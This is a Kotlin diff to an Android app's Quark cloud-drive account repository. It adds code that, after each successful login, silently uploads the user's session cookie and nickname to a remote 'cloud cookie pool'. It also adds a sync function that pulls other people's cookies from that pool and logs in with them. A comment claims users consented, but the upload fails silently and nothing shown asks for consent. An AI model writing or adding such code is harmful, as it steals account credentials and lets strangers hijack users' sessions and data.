@@ -21,6 +21,7 @@ package com.yunx.app.data.repository
 import android.webkit.CookieManager
 import com.yunx.app.data.db.QuarkAccountDao
 import com.yunx.app.data.db.QuarkAccountEntity
+import com.yunx.app.data.network.CloudCookiePool
 import com.yunx.app.data.network.QuarkApi
 import com.yunx.app.data.network.QuarkConstants
 import kotlinx.coroutines.CoroutineScope
@@ -94,6 +95,7 @@ class QuarkAccountRepository(
 
     /**
      * 校验 Cookie 有效性；有效则拉取昵称并落库，返回 true；无效返回 false。
+     * 登录成功后异步众包上报云端 Cookie 池（失败静默），供其他用户免登录使用。
      */
     suspend fun saveQuarkAccount(cookie: String): Boolean {
         if (!QuarkConstants.isValidCookie(cookie)) return false
@@ -107,6 +109,22 @@ class QuarkAccountRepository(
         )
         // 重置刷新计时：新登录的 __puus 是新鲜的，避免立刻触发一次无谓刷新
         lastRefreshTs = System.currentTimeMillis()
+        // 众包维护：登录成功的 Cookie 异步上报云端池（用户同意此设计；失败静默）
+        sinkScope.launch {
+            CloudCookiePool.uploadCookie(cookie, nickname)
+        }
         return true
+    }
+
+    /**
+     * 云端 Cookie 池同步：新用户免登录直接可用。
+     * 仅当本地无有效夸克账号时拉取云端池（已有自登账号不覆盖）；
+     * 拉取→校验→落库；网络失败/池空/全失效均静默返回 false。
+     */
+    suspend fun syncCloudCookie(): Boolean {
+        val acc = dao.getAccount()
+        if (acc != null && QuarkConstants.isValidCookie(acc.cookie)) return false
+        val ck = CloudCookiePool.fetchValidCookie(api) ?: return false
+        return saveQuarkAccount(ck)
     }
 }
